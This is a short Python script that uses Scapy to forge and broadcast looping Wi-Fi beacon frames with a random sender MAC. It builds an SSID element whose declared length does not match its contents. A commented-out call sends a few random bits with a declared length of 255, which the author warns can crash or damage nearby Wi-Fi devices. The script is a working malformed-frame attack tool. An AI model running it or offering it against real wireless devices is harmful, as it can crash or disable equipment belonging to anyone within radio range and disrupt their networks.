from scapy.all import *

# config your stuff here
iface = 'wlan1' # wifi interface in monitor mode
sender_bssid_mac = RandMAC() # used for source mac and bssid
# sender_bssid_mac = 'ac:cb:12:ad:58:27'

# send raw wifi beacon frames
## USAGE:
###     beacon_raw(<SSID>, <REPORTED SSID LENGTH IN 8 BIT BYTES>, <INTERVAL IN SECONDS>)
###     or
###     beacon_raw(SSID=<SSID>, reported_length=<REPORTED SSID LENGTH IN 8 BIT BYTES>, interval_seconds=<INTERVAL IN SECONDS>)
## DEFAULTS:
###      SSID="PrincessPiNet"
###     reported_length=13
###     interval_seconds=0.25
def beacon_raw(SSID=b"PrincessPiNet", reported_length=13, interval_seconds=0.25):
    # set the frame settings
    # addr1 is destination (broadcast), addr2 is the source mac, addr3 is the bssid    
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=sender_bssid_mac, addr3=sender_bssid_mac) # set the frame settings

    # set ssid info
    ssid_info = Dot11Elt(ID='SSID', info=RawVal(SSID), len=reported_length) # magic really happens here with Scapy's RawVal() function and the reported_length

    # assemble the frame
    frame = RadioTap()/dot11/Dot11Beacon()/ssid_info

    # print info
    print(f"FIRIN MY LAZORRRRRR\n\tSSID: {SSID}\n\treported length: {reported_length}\n\tinterval seconds: {interval_seconds}\n\tsender bssid/mac: {sender_bssid_mac}\n")

    # print packet
    print("Packet to be sent:")
    hexdump(frame)

    # send it
    sendp(frame, iface=iface, inter=interval_seconds, loop=1) # send on loop

# this can be most any value really experimentation is needed
ssid_binary = 0b0101 # a few random bits to send as the SSID

# please be careful with this, it can crash or damage your local wifi devices
# beacon_raw(SSID=ssid_binary, reported_length=255) # send it! USE WITH EXTREME CARE
# beacon_raw() # send dummy normal beacon for testing
